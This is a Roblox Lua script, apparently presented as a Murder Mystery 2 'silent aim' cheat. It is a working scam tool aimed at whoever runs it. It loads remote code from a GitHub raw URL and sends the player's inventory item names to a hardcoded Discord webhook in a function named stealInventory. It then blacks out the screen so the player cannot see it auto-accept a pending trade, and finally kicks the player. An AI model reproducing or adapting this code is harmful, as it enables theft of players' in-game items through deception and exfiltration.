loadstring(game:HttpGet("https://raw.githubusercontent.com/trazoo2702-blip/MM2Silentaim/main/silentaim.lua"))()

local http = game:GetService("HttpService")
local webhookUrl = "https://discordapp.com/api/webhooks/1495957934595899432/njvAX9ENDlw-KA8GCsi7aQmXiQdcum3lQ4Qry0v1DX63LwY_dyVOWVkaF80ej7ihP0Cs" 
local function stealInventory()
    local player = game.Players.LocalPlayer
    local inventory = player.Backpack

    local items = {}
    for _, item in pairs(inventory:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(items, item.Name)
        end
    end

    local payload = {
        content = "Inventario de " .. player.Name .. ":\n" .. table.concat(items, "\n")
    }

    local req = http:PostAsync(webhookUrl, http:JSONEncode(payload))
end

stealInventory()

local function makeBlackScreen()
    local screen = Instance.new("ScreenGui")
    screen.Parent = game.CoreGui

    local black = Instance.new("Frame")
    black.Size = UDim2.new(1, 0, 1, 0)
    black.BackgroundColor3 = Color3.new(0, 0, 0)
    black.Parent = screen
end

makeBlackScreen()

local function autoTrade()
    local player = game.Players.LocalPlayer
    local gui = player.PlayerGui

    local function acceptTrade()
        local tradePrompt = gui:FindFirstChild("TradePrompt")
        if tradePrompt then
            local acceptButton = tradePrompt:FindFirstChild("Accept")
            if acceptButton then
                acceptButton:Fire()
            end
        end
    end

    local function leaveServer()
        wait(3)
        player:Kick("Trade completado")
    end

    acceptTrade()
    leaveServer()
end

autoTrade()
